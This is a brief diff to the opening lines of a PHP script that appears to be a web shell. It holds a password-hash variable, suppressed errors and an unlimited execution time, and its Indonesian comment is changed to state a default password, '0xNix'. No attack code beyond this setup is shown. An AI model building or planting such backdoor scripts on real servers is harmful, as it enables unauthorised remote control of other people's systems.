@@ -1,5 +1,5 @@
 <?php
-$shellpass = "7f41aa189d28db14692557c2c9d984ec"; // nama pw taro disini biar ga lupa
+$shellpass = "7f41aa189d28db14692557c2c9d984ec"; // pw default: 0xNix | Bisa kalian ganti
 session_start();
 @error_reporting(0);
 @set_time_limit(0);
